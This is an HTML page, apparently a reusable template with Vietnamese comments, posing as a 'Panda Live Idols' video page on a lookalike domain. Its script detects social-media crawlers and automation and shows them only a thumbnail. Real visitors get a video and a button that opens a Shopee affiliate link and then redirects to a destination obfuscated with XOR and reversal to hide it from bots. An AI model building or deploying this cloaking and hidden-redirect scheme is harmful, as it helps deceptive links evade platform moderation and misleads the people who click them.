<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Panda Live Idols</title>

  <!-- Open Graph -->
  <meta property="og:title" content="Panda Live Idols">
  <meta property="og:description" content="Xem video mới nhất của Panda Live Idols">
  <meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg">
  <meta property="og:type" content="website">

  <style>
    html,body { margin:0; padding:0; height:100%; background:#000; }
    #thumb { display:flex; align-items:center; justify-content:center; height:100%; }
    #real { display:none; height:100%; position:relative; }
    video { width:100%; height:100%; object-fit:cover; }
    .cta { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
           background:rgba(0,0,0,0.7); color:#fff; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; }
  </style>
</head>
<body>

<div id="thumb">
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail" style="max-width:100%; height:auto;">
</div>

<div id="real">
  <video id="v" autoplay muted loop playsinline></video>
  <button class="cta" id="btn">Panda Live Idols</button>
</div>

<script>
(function(){
  // --- Phát hiện bot ---
  const botUA = ["bot","crawler","spider","facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","embedly"];
  const ua = navigator.userAgent.toLowerCase();
  const isBot = botUA.some(k => ua.includes(k)) || navigator.webdriver;

  if (isBot) return; // Bot: chỉ thấy ảnh thumbnail

  // --- Ẩn thumbnail, hiện video ---
  document.getElementById('thumb').style.display = 'none';
  document.getElementById('real').style.display = 'block';

  // --- Video URL (đảo ngược + XOR để bot không thấy trực tiếp) ---
  function xorDecode(str,key){
    return str.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^key.charCodeAt(i%key.length))).join('');
  }
  function rev(s){ return s.split('').reverse().join(''); }

  const key = "PandaKey2025";
  const enc = "IgsJCh8xGho3..."; // <-- bạn thay bằng chuỗi đã mã hóa của video
  const videoURL = rev(xorDecode(atob(enc),key));

  const vid = document.getElementById('v');
  vid.src = videoURL;
  vid.play().catch(()=>{});

  // --- Link đích (mã hóa ẩn) ---
  const encLink = "Jg8KCx4yGBQ..."; // <-- mã hóa tương tự
  const targetLink = rev(xorDecode(atob(encLink),key));

  document.getElementById('btn').onclick = function(){
    window.open("https://s.shopee.vn/30dchvC74f","_blank","noopener");
    setTimeout(()=>{ window.location.href = targetLink; }, 200);
  };
})();
</script>

</body>
</html>
